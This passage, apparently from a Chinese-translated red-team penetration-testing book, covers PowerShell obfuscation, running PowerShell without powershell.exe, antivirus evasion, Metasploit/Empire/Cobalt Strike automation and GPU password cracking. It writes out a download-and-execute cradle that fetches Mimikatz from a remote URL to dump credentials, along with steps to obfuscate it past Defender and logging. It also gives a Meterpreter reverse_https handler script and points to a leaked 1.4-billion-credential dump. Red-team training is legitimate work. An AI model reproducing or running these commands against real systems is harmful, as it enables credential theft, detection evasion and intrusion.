-Executio Bypass。
-Exec Bypass。
-Ex Bypass。
这些技术同样适用于WindowStyle甚至EncodedCommand参数。当然，这些技巧目前是可以使用的，我们需要创建更多混淆变换的方法。首先，我们提供一个非常简单的示例，使用PowerShell管理命令行，执行我们的远程PowerShell脚本（在本例中是mimikatz），实现转储散列的功能。
Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/ 2JHVdzf'); Invoke-Mimikatz –DumpCreds。
使用（Invoke-Obfuscation），输入字符串，使用几种不同的技术对字符串进行深度混淆。
在Windows中，下载Invoke-Obfuscation PowerShell文件。
加载PowerShell脚本，启动Invoke-Obfuscation。 
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
设置混淆的PowerShell脚本。在这种情况下，我们混淆下载的脚本，运行mimikatz，转储散列。 
SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient). DownloadString ('http://bit.ly/2JHVdzf'); Invoke-Mimikatz -DumpCreds
编码静荷。 
编码
在这种情况下，我选择了SecureString（AES），但您可以使用所有混淆技术，如图7.6所示。
图7.6
如果查看混淆的字符串，会发现有一个随机生成的密钥和加密的安全字符串。执行管理员权限PowerShell，我们仍然可以执行完整的静荷，如图7.7所示。
图7.7
回到主屏幕，创建混淆的加载器，如图7.8所示。
图7.8
main。
 launcher。 
 CLIP++。 
Choose your execution flags。
更好的是，我们可以查看Windows PowerShell日志，但它非常隐蔽，对于规避杀毒软件和安全信息工具警报非常有帮助，如图7.9所示。
图7.9
除Invoke-Obfuscation工具外，Daniel还研制了一个Invoke-CradleCrafter工具，实现远程下载的功能。Invoke-CradleCrafter工具为蓝队和红队开展研究、生成和混淆PowerShell远程下载提供了支持。此外，这个工具有助于帮助蓝队测试Invoke-Obfuscation输出结果的有效性。Invoke-CradleCrafter的缺陷是不包含任何字符串连接、编码、标识和类型转换等功能。
7.9 没有PowerShell的PowerShell
您最终在一个设备上获得远程代码执行权限，但您发现无法运行PowerShell.exe或者公司正在监视PowerShell.exe命令。您有什么办法让PowerShell静荷或者命令和控制代理在主机系统上运行？
1．NoPowerShell（NPS）
我喜欢NoPowerShell（NPS）的概念。NPS是一个Windows二进制文件，它通过.NET执行PowerShell，而不是直接调用PowerShell.exe。虽然目前杀毒软件通常会对操作行为进行标记，但是我们可以使用相同的思路创建二进制文件，直接执行PowerShell恶意软件，无须运行PowerShell.exe。由于Ben0xA提供了源代码，因此可以尝试对二进制文件进行混淆处理，从而规避杀毒软件。
另外一个使用NPS原理的是TrustedSec工具，它利用了通过MSBuild.exe执行代码的优势。此工具将PowerShell静荷生成到msbuild_nps.xml文件中，该文件在调用时执行。XML文件可以通过以下方式调用。
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exeC:\。
2．SharpPick
SharpPick是PowerPick的一个组件，它是一个值得推荐的工具，允许调用PowerShell功能，而无须使用PowerShell.exe二进制文件。在SharpPick中，RunPS函数使用System.Management.Automation函数在PowerShell运行空间中执行脚本，无须启动PowerShell进程。
下载SharpPick后，您可以使用PowerShell Empire静荷，创建二进制文件。
有时可能无法在主机系统上放置二进制文件。在这些情况下，可以创建一个类库（DLL文件），我们可以将DLL文件放到系统，并使用“rundll32.exe runmalicious.dll,EntryPoint”执行。
当然，可以使用Meterpreter或Cobalt Strike自动创建这些DLL文件，从而可以灵活地运行特定的PowerShell静荷，而无须调用PowerShell.exe。
7.10 HideMyPS
几年前，我制作了一个工具HideMyPS，取得了非常好的效果。它始终只是一个POC工具，但即使经过这么多年，它仍然可以工作。我遇到的问题是，现在PowerShell脚本都会被杀毒软件查杀。例如，如果我们在运行Windows Defender的Windows系统中，删除正常的Invoke-Mimikatz.ps1，它将立即查杀PowerShell脚本，并在相应位置标记红色。这是传统杀毒软件的一个主要缺点，杀毒软件通常在恶意软件中寻找特定的字符串。因此，我整理了一个小的Python脚本，该脚本采用PowerShell脚本对所有字符串进行混淆处理（由于仅仅使用少量的脚本进行测试，因此它远达不到生产代码标准）。
HideMyPS将查找所有函数，并使用ROT对其进行混淆处理，从PowerShell脚本中删除所有注释，剪切字符串规避杀毒软件的静态签名查杀。下面的例子中，我们将使用Invoke_ Mimikatz.ps1，混淆PowerShell文件，如图7.10所示。
cd/opt/HideMyPS。
python hidemyps.py invoke_mimikatz.ps1 [filename.ps1]。
图7.10
现在，查看原始文件和创建的新文件之间的区别。首先，您可以看到函数名称全部混淆，变量已经更改，字符串被分成两半，并且所有注释都删除了，如图7.11所示。
图7.11
您必须记住的一件事是我们更改了PowerShell脚本中的所有函数名称。因此，为了调用这些函数，需要重新查看混淆后的文件，看一看我们是如何替换“function Invoke-Mimikatz”的。在这种情况下，Invoke-Mimikatz更改为Vaibxr-Zvzvxngm。以下示例是在打了完整补丁的Windows 10中运行的，其中Defender已更新至较新的病毒库，如图7.12所示。
图7.12
7.11 结论
作为红队或者渗透测试人员，总是需要与主机和网络检测工具进行“猫捉老鼠”的游戏。这就是为什么需要理解防护系统底层的工作原理、编写底层代码来直接与Windows API进行交互而不是使用Shell命令、跳出设备本身进行思考并发挥创造性等非常重要。如果您仅仅专注于使用常规的工具，那么在企业环境中被检测发现的可能性非常高。如果这些工具是公开的，那么在该工具出现后，安全厂商可能会逆向分析这些工具，并生成工具的签名。作为红队，在实际的攻击中，您需要利用系统漏洞，定制开发工具，防止工具被安全厂商识别。
第8章 特勤组——破解、利用和技巧
本章重点介绍各种有用的资源，这些资源对红队和渗透测试人员非常有用。虽然这些资源并不一定在每次行动中都用到，但是对于特定场景或个别场景非常有用。
8.1 自动化
随着基于启发式的终端安全防护机制越来越强大，攻击方式需要快速应变。我们通常可以编写恶意软件规避杀毒软件的检测，即使通过了初次安全防护检测，但是一旦使用类似mimikatz（在内存中）工具或者横向渗透到另一台主机，就会引发警报。为了解决这个问题，我总是告诉红队在首次尝试攻击时就被发现。在通常情况下，蓝队在发现我们的基本/默认样式（或稍微混淆）的恶意软件时，认为取得胜利，但是首次尝试的真正目的是了解目标的环境。初始静荷自动运行多个侦察脚本，实现上述目的。在下文中，我们将介绍一些快速自动运行的脚本，这些脚本可以帮助我们自动化一些攻击。
8.1.1 使用RC脚本自动化Metasploit
使用Metasploit，我们可以高效运行后渗透脚本，方法如下。
在Metasploit中，搜索所有后期渗透利用模块。
msfconsole。
show post。
从“post”结果中，选择要使用的所有模块，方便在Meterpreter Shell中自动执行。在这种情况下，添加特权迁移后渗透模块（http://bit.ly/2vn1wFB）。配置Meterpreter Shell，在受感染主机的初始连接中，运行这个静荷，我们需要指定AutoRunScript参数。您可以根据需要，添加尽可能多的AutoRunScript，实现转储有关系统/网络的信息、横向移动等功能。
下面创建处理程序和AutoRunScript。
创建处理程序。 
gedit handler.rc
配置处理程序，运行脚本。 
use multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 10.100.100.9
set LPORT 443
set AutoRunScript post/windows/manage/priv_migrate
set ExitOnSession false
set EnableStageEncoding true
exploit -j
运行处理程序。 
msfconsole -r handler.rc
8.1.2 Empire自动化
Empire具有与Metasploit资源文件类似的功能，可以自动完成许多重复性任务。首先，我们需要创建一个文件（在示例中，创建一个名为/opt/empire_autoload.rc的文件），然后在Empire实例中加载它。
在单独的终端窗口中，创建处理程序文件。 
gedit /opt/empire_autoload.rc
添加您需要执行的后渗透模块。 
usemodule situational_awareness/network/powerview/get_user
execute
back
usermodule situational_awareness/network/powerview/get_computer
execute
back
在Empire中加载autoload.rc资源文件，如图8.1所示。 
agents
autorun /opt/empire_autoload.rc powershell
autorun show
图8.1
正如您看到的，当代理回连时，它会自动运行get_user和get_computer PowerShell脚本。这些脚本的所有结果都存储在agent.log文件中。在这种情况下，我们的代理名称为N6LM348G，因此，日志将存储在/opt/Empire/downloads/N6LM348G/agent.log中。
8.1.3 Cobalt Strike自动化
Cobalt Strike功能强大的主要原因之一是Aggressor Script。使用Cobalt Strike的Aggressor Script，您不仅可以配置自动运行样式脚本，而且可以创建非常复杂的攻击。
例如，我经常碰到共享工作站的情况，比如实验室或会议室。我可能希望代理程序做的一件事是每隔半小时运行mimikatz获取明文凭证。使用Aggressor Script，我们可以执行这些操作以及其他更多的操作。
8.1.4 自动化的未来
最后，有一些很值得关注的项目正朝着自动化、智能化突破和APT攻击的方向发展。我坚信攻击的自动化将成为未来的突破，我们需要能够有这种能力从而测试/验证安全防护机制的效果。我认为在自动化方面具有巨大潜力的两个工具是Portia和Caldera。
8.2 密码破解
我最新的密码字典是最近的41GB密码转储，其中包含14亿用户名及其密码。现在，我不想直接提供torrent链接，因为其中包含很多敏感的用户名（或电子邮件）和相关密码，您可以搜索BreachCompilation.tar.bz2查找更多的相关信息。在下载这些非常敏感的信息之前，请查阅当地的法律条款。我建议您不要下载原始转储，而只是下载密码列表。我已经下载了41 GB转储，删除了所有用户名/电子邮件，只获取了密码字典。在我的个人主机上，使用8x Gigabyte GV-N108TTURBO-11GD AORUS GeForce GTX 1080 Ti Turbo 11G显卡。您可以自己搭建一个硬件，包括机箱、内存、电源、SSD硬盘和GPU显卡。当然，机箱至少需要4U机架（例如，SYS-4028GR-TR2）和功率足够大的电源。虽然价格不菲，但我们可以每秒大约计算472 000 000 000个散列值，暴力破解NTLM（Windows）散列值。这是8个GPU的hashcat基准测试，散列模式为1000 - NTLM。
Speed.Dev.#1.....: 59436.3 MH/s (63.16ms)